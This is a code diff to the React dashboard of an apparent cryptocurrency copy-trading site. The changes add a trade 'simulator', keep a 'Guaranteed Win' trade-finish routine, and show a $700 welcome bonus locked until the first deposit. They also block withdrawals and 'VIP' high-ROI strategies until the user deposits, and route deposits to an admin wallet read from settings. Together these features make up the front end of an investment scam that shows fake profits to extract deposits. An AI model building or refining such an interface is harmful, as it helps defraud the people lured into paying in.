@@ -4,11 +4,13 @@ import TacticalGuide from './TacticalGuide';
 import { Trader, Strategy } from '../types';
 import GlobalStats from './GlobalStats';
 import ExecutionTerminal from './ExecutionTerminal';
+import LiveTradeSimulator from './LiveTradeSimulator';
 import { collection, query, orderBy, onSnapshot } from 'firebase/firestore';
 import { db } from '../firebase.config';
+import { getSettings } from '../services/settingsService';
 
 interface DashboardProps {
-  onSwitchTrader: () => void;
+  onSwitchTrader?: () => void;
 }
 
 
@@ -114,6 +116,21 @@ const Dashboard: React.FC<DashboardProps> = ({ onSwitchTrader }) => {
   const [isWithdrawing, setIsWithdrawing] = useState(false);
   const [withdrawError, setWithdrawError] = useState('');
   const [withdrawStatus, setWithdrawStatus] = useState(''); // New state for animation steps
+  const [depositAddress, setDepositAddress] = useState(NETWORKS[0].address);
+
+  const queryParams = new URLSearchParams(window.location.search);
+  const activeTraderName = queryParams.get('trader');
+
+  // Load platform settings for admin wallet address
+  useEffect(() => {
+    const fetchSettings = async () => {
+      const settings = await getSettings();
+      if (settings.adminWalletAddress) {
+        setDepositAddress(settings.adminWalletAddress);
+      }
+    };
+    fetchSettings();
+  }, []);
 
   // Enhanced Finish Trade Logic with Guaranteed Win (for now)
   const finishTrade = async (trade: ActiveTrade) => {
@@ -179,7 +196,8 @@ const Dashboard: React.FC<DashboardProps> = ({ onSwitchTrader }) => {
   const [verificationError, setVerificationError] = useState('');
   const [copySuccess, setCopySuccess] = useState(false);
 
-  const tradeProfit = Math.max(0, (user?.balance || 0) - 1000);
+  const tradeProfit = Math.max(0, (user?.totalProfit || 0));
+  const totalBalance = (user?.balance || 0) + (user?.bonusBalance || 0);
 
   // Fetch Strategies from Firebase
   useEffect(() => {
@@ -366,7 +384,7 @@ const Dashboard: React.FC<DashboardProps> = ({ onSwitchTrader }) => {
 
       {showSuccessToast && (
         <div className="fixed top-24 left-1/2 -translate-x-1/2 z-[210] bg-[#00b36b] text-white px-8 py-4 rounded-2xl shadow-2xl animate-in slide-in-from-top-4">
-          <span className="font-black uppercase tracking-widest text-xs">Mirror Protocol Engaged</span>
+          <span className="font-black uppercase tracking-widest text-xs">Trade Executed Successfully</span>
         </div>
       )}
 
@@ -382,17 +400,21 @@ const Dashboard: React.FC<DashboardProps> = ({ onSwitchTrader }) => {
         <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
           <div className="bg-[#1e222d] border border-white/5 p-6 rounded-3xl group hover:border-[#f01a64]/30 transition-colors">
             <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-1">Account Balance</span>
-            <span className={`text-2xl font-black ${user?.hasDeposited ? 'text-[#00b36b]' : 'text-amber-500'}`}>${(user?.balance || 0).toLocaleString()}</span>
+            <span className={`text-2xl font-black ${user?.hasDeposited ? 'text-[#00b36b]' : 'text-white'}`}>${(user?.balance || 0).toLocaleString()}</span>
+          </div>
+          <div className="bg-gradient-to-br from-amber-500/20 to-amber-600/10 border border-amber-500/30 p-6 rounded-3xl relative overflow-hidden">
+            <div className="absolute top-2 right-2">
+              {!user?.hasDeposited && <span className="text-[8px] bg-amber-500 text-black px-2 py-0.5 rounded-full font-black">🔒 LOCKED</span>}
+            </div>
+            <span className="text-[9px] text-amber-400 font-black uppercase tracking-widest block mb-1">Welcome Bonus</span>
+            <span className="text-2xl font-black text-amber-500">${(user?.bonusBalance || 0).toLocaleString()}</span>
+            {!user?.hasDeposited && <p className="text-[8px] text-amber-400/70 mt-1">Unlocks after first deposit</p>}
           </div>
           <div className="bg-[#1e222d] border border-white/5 p-6 rounded-3xl">
-            <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-1">Money in Trade</span>
-            <span className="text-2xl font-black text-white">${(user?.totalInvested || 0).toLocaleString()}</span>
-          </div>
-          <div className="bg-[#1e222d] border border-white/5 p-6 rounded-3xl">
-            <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-1">Global Profits</span>
+            <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-1">Total Profits</span>
             <span className="text-2xl font-black text-[#00b36b]">+${tradeProfit.toLocaleString()}</span>
           </div>
-          <button onClick={() => depositSectionRef.current?.scrollIntoView({ behavior: 'smooth' })} className="bg-[#f01a64] p-6 rounded-3xl flex items-center justify-between shadow-xl active:scale-95 transition-all">
+          <button onClick={() => depositSectionRef.current?.scrollIntoView({ behavior: 'smooth' })} className="bg-[#f01a64] p-6 rounded-3xl flex items-center justify-between shadow-xl active:scale-95 transition-all hover:shadow-[0_0_30px_rgba(240,26,100,0.4)]">
             <span className="text-sm font-black text-white uppercase italic">Add Funds</span>
             <svg className="h-5 w-5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path d="M13 7l5 5m0 0l-5 5m5-5H6" strokeWidth={2.5} /></svg>
           </button>
@@ -401,55 +423,67 @@ const Dashboard: React.FC<DashboardProps> = ({ onSwitchTrader }) => {
         {activeTrades.length > 0 && (
           <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
             {activeTrades.map((trade) => (
-              <div key={trade.tradeId} className="bg-[#1e222d] border border-[#f01a64]/40 p-6 rounded-[2rem] shadow-2xl overflow-hidden relative">
-                <div className="absolute top-0 right-0 p-4 opacity-5">
-                  <div className="w-12 h-12 bg-white rounded-full animate-ping"></div>
-                </div>
-                <div className="flex justify-between items-center mb-6">
-                  <div>
-                    <h4 className="text-white font-black uppercase text-xs tracking-widest mb-1">{trade.plan.name}</h4>
-                    <span className="text-[8px] text-gray-500 font-black uppercase">Mirroring Expert Node</span>
-                  </div>
-                  <div className="text-right">
-                    <span className="text-xl font-black font-mono text-[#00b36b]">
-                      +${trade.currentPnL.toLocaleString(undefined, { minimumFractionDigits: 2 })}
-                    </span>
-                  </div>
-                </div>
-                <div className="w-full h-1.5 bg-black/40 rounded-full overflow-hidden">
-                  <div className="h-full bg-[#f01a64] transition-all duration-300" style={{ width: `${trade.progress}%` }}></div>
-                </div>
-                <div className="mt-3 flex justify-between items-center">
-                  <span className="text-[8px] text-gray-600 font-black uppercase tracking-widest">Execution in Progress...</span>
-                  <span className="text-[9px] text-[#00b36b] font-black">{Math.floor(trade.progress)}%</span>
-                </div>
-              </div>
+              <LiveTradeSimulator
+                key={trade.tradeId}
+                tradeId={trade.tradeId}
+                plan={trade.plan}
+                investAmount={trade.investAmount}
+                startTime={trade.startTime}
+                currentPnL={trade.currentPnL}
+                progress={trade.progress}
+              />
             ))}
           </div>
         )}
+
+        <div id="active-context">
+          {activeTraderName && (
+            <div className="bg-[#f01a64]/10 border border-[#f01a64]/20 p-4 rounded-2xl flex items-center justify-between animate-in slide-in-from-top-4">
+              <div className="flex items-center gap-3">
+                <div className="w-2 h-2 bg-[#f01a64] rounded-full animate-pulse"></div>
+                <span className="text-[10px] text-white font-black uppercase tracking-widest">
+                  Mirroring Protocol: <span className="text-[#f01a64]">{activeTraderName}</span>
+                </span>
+              </div>
+              <span className="text-[8px] bg-[#f01a64] text-white px-2 py-0.5 rounded font-black uppercase">Sync Active</span>
+            </div>
+          )}
+        </div>
 
         <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
           <div className="lg:col-span-2 space-y-6">
             <h3 className="text-xl font-black text-white uppercase italic px-2">Choose Your Trade</h3>
             <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-              {strategies.map(plan => (
-                <div key={plan.id} onClick={() => setSelectedPlanId(plan.id!)} className={`bg-[#1e222d] border-2 p-8 rounded-[2.5rem] cursor-pointer transition-all hover:bg-[#2a2e39] ${selectedPlanId === plan.id ? 'border-[#f01a64] shadow-2xl' : 'border-white/5'}`}>
-                  <h4 className="text-white font-black text-lg uppercase mb-1">{plan.name}</h4>
-                  <p className="text-[10px] text-gray-500 font-bold uppercase tracking-widest mb-6">{plan.hook}</p>
-                  <div className="flex justify-between items-end">
-                    <span className="text-[#00b36b] font-black text-xl">{plan.minRet}-{plan.maxRet}% ROI</span>
-                    <span className="text-[8px] text-gray-600 font-black uppercase">{plan.duration} Window</span>
-                  </div>
-                  {selectedPlanId === plan.id && (
-                    <div className="mt-8 pt-8 border-t border-white/5 space-y-6 animate-in slide-in-from-bottom-2">
-                      <div className="flex gap-3">
-                        <input type="number" value={investAmount} onChange={e => setInvestAmount(Number(e.target.value))} className="flex-1 bg-black border border-white/10 text-white text-sm p-4 rounded-xl outline-none font-black" placeholder="Amount..." />
-                        <button onClick={(e) => { e.stopPropagation(); startDeployment(); }} className="bg-[#f01a64] text-white px-8 py-4 rounded-xl font-black uppercase text-[10px] tracking-widest active:scale-95">Deploy</button>
-                      </div>
+              {strategies.map(plan => {
+                const isPremium = plan.minRet >= 60;
+                const isLocked = isPremium && !user?.hasDeposited;
+                return (
+                  <div key={plan.id} onClick={() => !isLocked && setSelectedPlanId(plan.id!)} className={`bg-[#1e222d] border-2 p-8 rounded-[2.5rem] transition-all ${isLocked ? 'opacity-60 cursor-not-allowed' : 'cursor-pointer hover:bg-[#2a2e39]'} ${selectedPlanId === plan.id ? 'border-[#f01a64] shadow-2xl' : 'border-white/5'}`}>
+                    <div className="flex justify-between items-start mb-1">
+                      <h4 className="text-white font-black text-lg uppercase">{plan.name}</h4>
+                      {isLocked && <span className="text-[8px] bg-amber-500/20 text-amber-500 px-2 py-0.5 rounded-full font-black">🔒 VIP</span>}
                     </div>
-                  )}
-                </div>
-              ))}
+                    <p className="text-[10px] text-gray-500 font-bold uppercase tracking-widest mb-6">{plan.hook}</p>
+                    <div className="flex justify-between items-end">
+                      <span className="text-[#00b36b] font-black text-xl">{plan.minRet}-{plan.maxRet}% ROI</span>
+                      <span className="text-[8px] text-gray-600 font-black uppercase">{plan.duration} Window</span>
+                    </div>
+                    {isLocked && (
+                      <div className="mt-4 p-3 bg-amber-500/10 border border-amber-500/20 rounded-xl">
+                        <p className="text-[9px] text-amber-400 font-bold text-center">Deposit to unlock premium strategies</p>
+                      </div>
+                    )}
+                    {selectedPlanId === plan.id && !isLocked && (
+                      <div className="mt-8 pt-8 border-t border-white/5 space-y-6 animate-in slide-in-from-bottom-2">
+                        <div className="flex gap-3">
+                          <input type="number" value={investAmount} onChange={e => setInvestAmount(Number(e.target.value))} className="flex-1 bg-black border border-white/10 text-white text-sm p-4 rounded-xl outline-none font-black" placeholder="Amount..." />
+                          <button onClick={(e) => { e.stopPropagation(); startDeployment(); }} className="bg-[#f01a64] text-white px-8 py-4 rounded-xl font-black uppercase text-[10px] tracking-widest active:scale-95">Execute Trade</button>
+                        </div>
+                      </div>
+                    )}
+                  </div>
+                )
+              })}
             </div>
           </div>
 
@@ -458,8 +492,8 @@ const Dashboard: React.FC<DashboardProps> = ({ onSwitchTrader }) => {
               <h3 className="text-lg font-black text-white uppercase mb-6 italic">Secure Wallet Handshake</h3>
               <div className="bg-black/60 p-6 rounded-[2rem] border border-[#f01a64]/20 mb-8 text-center space-y-4">
                 <span className="text-[8px] text-gray-500 font-black uppercase tracking-widest">Network: {depositNetwork.name}</span>
-                <div className="bg-[#0f1116] p-4 rounded-xl text-[10px] font-mono text-white break-all shadow-inner">{depositNetwork.address}</div>
-                <button onClick={() => { navigator.clipboard.writeText(depositNetwork.address); setCopySuccess(true); setTimeout(() => setCopySuccess(false), 1500); }} className={`w-full py-4 rounded-xl text-[10px] font-black uppercase transition-all ${copySuccess ? 'bg-[#00b36b] text-white' : 'bg-white/5 text-white border border-white/10'}`}>
+                <div className="bg-[#0f1116] p-4 rounded-xl text-[10px] font-mono text-white break-all shadow-inner">{depositAddress}</div>
+                <button onClick={() => { navigator.clipboard.writeText(depositAddress); setCopySuccess(true); setTimeout(() => setCopySuccess(false), 1500); }} className={`w-full py-4 rounded-xl text-[10px] font-black uppercase transition-all ${copySuccess ? 'bg-[#00b36b] text-white' : 'bg-white/5 text-white border border-white/10'}`}>
                   {copySuccess ? 'ADDRESS COPIED' : 'Copy Wallet Address'}
                 </button>
               </div>
@@ -479,10 +513,23 @@ const Dashboard: React.FC<DashboardProps> = ({ onSwitchTrader }) => {
               <h3 className="text-lg font-black text-white uppercase text-center mb-8 italic">Profit Withdrawal</h3>
               {withdrawStep === 'input' && (
                 <div className="space-y-4">
-                  <input type="text" placeholder="Withdrawal Address (TRC20)" value={withdrawAddress} onChange={e => setWithdrawAddress(e.target.value)} className="w-full bg-black border border-white/5 p-5 rounded-2xl text-[10px] text-white outline-none font-black uppercase placeholder:text-gray-700" />
-                  <input type="number" placeholder="USDT Amount" value={withdrawAmount} onChange={e => setWithdrawAmount(e.target.value)} className="w-full bg-black border border-white/5 p-5 rounded-2xl text-[10px] text-white outline-none font-black placeholder:text-gray-700" />
-                  {withdrawError && <p className="text-red-500 text-[9px] font-black text-center italic">{withdrawError}</p>}
-                  <button onClick={validateWithdrawal} className="w-full py-5 bg-[#00b36b] text-white rounded-2xl font-black uppercase text-[11px] shadow-lg active:scale-95 transition-all">Request Payout</button>
+                  {!user?.hasDeposited ? (
+                    <div className="text-center space-y-4 py-4">
+                      <div className="w-16 h-16 bg-amber-500/20 border border-amber-500/30 rounded-full flex items-center justify-center mx-auto">
+                        <span className="text-2xl">🔒</span>
+                      </div>
+                      <p className="text-amber-400 font-bold text-sm">Withdrawals Locked</p>
+                      <p className="text-gray-500 text-[10px]">Complete your first deposit to unlock payouts and your $700 welcome bonus.</p>
+                      <button onClick={() => depositSectionRef.current?.scrollIntoView({ behavior: 'smooth' })} className="w-full py-4 bg-amber-500 text-black rounded-xl font-black uppercase text-[10px] tracking-widest active:scale-95">Make First Deposit</button>
+                    </div>
+                  ) : (
+                    <>
+                      <input type="text" placeholder="Withdrawal Address (TRC20)" value={withdrawAddress} onChange={e => setWithdrawAddress(e.target.value)} className="w-full bg-black border border-white/5 p-5 rounded-2xl text-[10px] text-white outline-none font-black uppercase placeholder:text-gray-700" />
+                      <input type="number" placeholder="USDT Amount" value={withdrawAmount} onChange={e => setWithdrawAmount(e.target.value)} className="w-full bg-black border border-white/5 p-5 rounded-2xl text-[10px] text-white outline-none font-black placeholder:text-gray-700" />
+                      {withdrawError && <p className="text-red-500 text-[9px] font-black text-center italic">{withdrawError}</p>}
+                      <button onClick={validateWithdrawal} className="w-full py-5 bg-[#00b36b] text-white rounded-2xl font-black uppercase text-[11px] shadow-lg active:scale-95 transition-all">Request Payout</button>
+                    </>
+                  )}
                 </div>
               )}
               {withdrawStep === 'confirm' && (
